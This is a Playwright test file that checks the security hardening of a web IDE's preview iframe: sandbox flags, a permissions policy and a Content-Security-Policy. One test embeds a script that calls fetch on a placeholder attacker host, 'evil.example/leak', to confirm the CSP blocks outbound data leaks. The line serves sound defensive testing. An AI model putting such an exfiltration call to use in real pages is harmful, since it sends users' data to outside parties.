import { test, expect } from '@playwright/test';

/**
 * Browser-level preview hardening checks.
 *
 * The short-term preview intentionally keeps `allow-same-origin` so existing
 * previews keep working. These specs pin the other defences in place: a
 * sandbox, a permissions policy, and a CSP on the generated document.
 */

async function mountPreview(page: import('@playwright/test').Page, html: string) {
  await page.evaluate(async (body) => {
    const harness = (window as any).__codelabTest;
    harness.mount({ files: { 'index.js': '' } });
    const ide = harness.ide;
    ide.portTable.registerServer(3000, {
      name: 'http-server',
      pid: 1,
      fetch: () => new Response(body, { headers: { 'Content-Type': 'text/html; charset=utf-8' } })
    });
    await ide._openWebPreview(3000);
  }, html);
}

test.beforeEach(async ({ page }) => {
  await page.route('https://cdn.jsdelivr.net/**', route => route.abort());
  await page.goto('/tests/browser/fixtures/');
});

test('preview iframe is sandboxed and carries a CSP', async ({ page }) => {
  await mountPreview(page, '<!doctype html><html><head><title>App</title></head><body>preview</body></html>');

  const attrs = await page.evaluate(() => {
    const iframe = document.querySelector('#cl-preview-iframe');
    return {
      sandbox: iframe ? iframe.getAttribute('sandbox') : null,
      allow: iframe ? iframe.getAttribute('allow') : null,
      srcdoc: iframe ? iframe.getAttribute('srcdoc') : null
    };
  });

  expect(attrs.sandbox).toContain('allow-scripts');
  // Same-origin is kept until the dedicated preview origin lands (P1-2).
  expect(attrs.sandbox).toContain('allow-same-origin');
  expect(attrs.allow).toContain('camera');
  expect(attrs.allow).toContain('geolocation');
  expect(attrs.srcdoc).toContain('http-equiv="Content-Security-Policy"');
  expect(attrs.srcdoc).toContain("default-src 'self' data: blob:");
  expect(attrs.srcdoc).toContain("object-src 'none'");
  expect(attrs.srcdoc).toContain('<base href="/__preview/3000/">');
});

test('preview CSP blocks requests to third-party origins', async ({ page }) => {
  const externalRequests: string[] = [];
  page.on('request', request => {
    if (request.url().startsWith('https://evil.example/')) externalRequests.push(request.url());
  });

  await mountPreview(
    page,
    '<!doctype html><html><head><title>App</title></head><body>' +
      '<script>fetch("https://evil.example/leak").catch(() => {});</script>' +
      'preview</body></html>'
  );

  await page.waitForTimeout(500);
  expect(externalRequests).toEqual([]);

  const csp = await page.evaluate(() => {
    const iframe = document.querySelector('#cl-preview-iframe');
    const doc = iframe ? iframe.getAttribute('srcdoc') : '';
    return doc || '';
  });
  expect(csp).toContain('connect-src');
});
